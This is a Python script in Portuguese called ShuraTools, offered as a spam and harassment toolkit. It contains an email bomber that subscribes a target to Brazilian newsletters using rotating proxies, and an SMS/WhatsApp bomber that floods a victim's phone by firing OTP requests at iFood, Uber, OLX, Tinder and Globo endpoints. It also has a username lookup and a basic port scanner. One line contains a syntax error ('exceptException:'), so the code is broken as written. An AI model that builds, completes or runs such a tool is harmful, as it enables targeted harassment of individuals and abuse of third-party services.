#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v3.3 Ultimate (SMS/Zap Bomber)
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

# Tentativa de importar bibliotecas externas
try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Faltam dependências. Execute: pip install requests faker colorama")
    sys.exit(1)

# Banner ASCII estilizado
BANNER = f"""
{Fore.CYAN}  _____ _    _ _    _ _____            
{Fore.CYAN} / ____| |  | | |  | |  __ \     /\    
{Fore.CYAN}| (___ | |__| | |  | | |__) |   /  \   
{Fore.CYAN} \___ \|  __  | |  | |  _  /   / /\ \  
{Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
{Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                       
{Fore.YELLOW}  >> SpamMail | SMS/Zap | OSINT | PortScan <<
{Fore.RED}       v3.3 Ultimate Upgrade - by Shura
"""

LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "osint": Fore.MAGENTA + "[?] ",
        "menu": Fore.CYAN + " > "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

# ---------- Helpers ----------
def safe_int(prompt, default):
    try:
        val = input(prompt)
        if not val: return default
        return int(val)
    except ValueError:
        log(f"Entrada inválida. Usando padrão: {default}", "warn")
        return default

def get_proxy():
    if PROXY_QUEUE.empty(): return None
    p = PROXY_QUEUE.get(); PROXY_QUEUE.put(p)
    return {"http": f"http://{p}", "https": f"http://{p}"}

# ---------- Módulo SpamMail ----------
def spam_mail(target, qty, threads, use_proxy):
    endpoints = [
        {"url": "https://www.infoq.com/newsletter/subscribe.action", "data": {"email": target, "newsletterId": "1"}},
        {"url": "https://www.tecmundo.com.br/newsletter", "data": {"email": target}},
        {"url": "https://www.canaltech.com.br/newsletter/", "data": {"email": target}},
        {"url": "https://www.kabum.com.br/newsletter", "data": {"email": target}}
    ]
    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                proxies = get_proxy() if use_proxy else None
                site = random.choice(endpoints)
                headers = {"User-Agent": random.choice(UA_LIST), "Referer": site["url"]}
                session.post(site["url"], data=site["data"], headers=headers, timeout=10, proxies=proxies)
                log(f"E-mail {i+1} enviado via {site['url'].split('/')[2]}", "success")
                time.sleep(random.uniform(0.5, 1.2))
            except: log(f"E-mail {i+1} falhou.", "error")
    run_threads(job, qty, threads)

# ---------- Módulo SMS/Zap Bomber (NOVO) ----------
def spam_social(target, qty, threads, type="sms"):
    """
    Trigger de códigos OTP (SMS) e solicitações de verificação (Zap).
    Nota: target deve estar no formato DDI DDD NUMERO (ex: 5511999999999)
    """
    log(f"Iniciando Bomber {type.upper()} para {target}...", "warn")
    
    # Endpoints que disparam SMS OTP/Call no Brasil
    endpoints = [
        {"url": "https://api.ifood.com.br/v2/user/request_otp", "json": {"email": f"{os.urandom(4).hex()}@gmail.com", "phone": target}},
        {"url": "https://login.uber.com/lookup", "json": {"userIdentifier": f"+{target}"}},
        {"url": "https://www.olx.com.br/api/v1/user/otp", "json": {"phone": target}},
        {"url": "https://api.tinder.com/v2/auth/sms/send", "json": {"phone_number": f"+{target}"}},
        {"url": "https://auth.globo.com/api/send-otp", "json": {"phone": target}}
    ]

    def job(start, end):
        session = requests.Session()
        for i in range(start, end):
            try:
                site = random.choice(endpoints)
                headers = {"User-Agent": random.choice(UA_LIST)}
                res = session.post(site["url"], json=site["json"], headers=headers, timeout=10)
                if res.status_code < 400:
                    log(f"{type.upper()} {i+1} disparado com sucesso.", "success")
                else:
                    log(f"{type.upper()} {i+1} Status {res.status_code} (Bloqueado/Limte).", "warn")
                time.sleep(random.uniform(1.0, 3.0)) # Delay maior para não ser banido pelo IP do alvo
            exceptException:
                log(f"{type.upper()} {i+1} falhou (Conexão).", "error")

    run_threads(job, qty, threads)

# ---------- Módulo OSINT Hunter ----------
def osint_lookup(target):
    log(f"Investigando: {target}", "osint")
    user = target.replace("@", "")
    plats = {"Instagram": f"https://www.instagram.com/{user}/", "GitHub": f"https://github.com/{user}"}
    for n, u in plats.items():
        try:
            r = requests.get(u, timeout=5, headers={"User-Agent": random.choice(UA_LIST)})
            log(f"{n}: {'ENCONTRADO' if r.status_code == 200 else 'Não encontrado'}", "success" if r.status_code == 200 else "info")
        except: pass

# ---------- Port Scanner ----------
def port_scan(target):
    log(f"Escaneando portas em {target}...", "osint")
    try:
        host = target.split("@")[-1] if "@" in target else target
        ip = socket.gethostbyname(host)
        for port in [80, 443, 8080]:
            s = socket.socket()
            s.settimeout(1.0)
            if s.connect_ex((ip, port)) == 0: log(f"Porta {port} ABERTA", "success")
            s.close()
    except: log("Erro ao resolver host.", "error")

# ---------- Threading Core ----------
def run_threads(target_func, qty, threads):
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=target_func, args=(curr, curr + take))
        t.start(); ts.append(t); curr += take
    for t in ts: t.join()

# ---------- Menu Principal ----------
def menu():
    while True:
        try:
            clear()
            print(BANNER)
            print(f"[ 1 ] Spam de E-mail (Power Mode)")
            print(f"[ 2 ] SMS Bomber (OTP Flood)")
            print(f"[ 3 ] WhatsApp Bomber (Verify Flood)")
            print(f"[ 4 ] OSINT Hunter (Social Search)")
            print(f"[ 5 ] Port Scanner (Rede)")
            print(f"[ 0 ] Sair")
            print("-" * 40)
            
            opt = input(f"{Fore.YELLOW}Opção: {Style.RESET_ALL}").strip()
            if opt == "0": break
            
            if opt in ["1", "2", "3", "4", "5"]:
                target = input(f"{Fore.YELLOW}Alvo (email, fone ou IP): {Style.RESET_ALL}").strip()
                if not target: continue
                
                if opt == "1": spam_mail(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 5), False)
                elif opt == "2": spam_social(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 2), "sms")
                elif opt == "3": spam_social(target, safe_int("Qtd: ", 10), safe_int("Threads: ", 2), "zap")
                elif opt == "4": osint_lookup(target)
                elif opt == "5": port_scan(target)
                
                input(f"\n{Fore.GREEN}Pressione ENTER para continuar...{Style.RESET_ALL}")
        except KeyboardInterrupt: break
        except Exception as e:
            log(f"Erro: {e}", "error"); input("\nENTER...")

if __name__ == "__main__":
    menu()
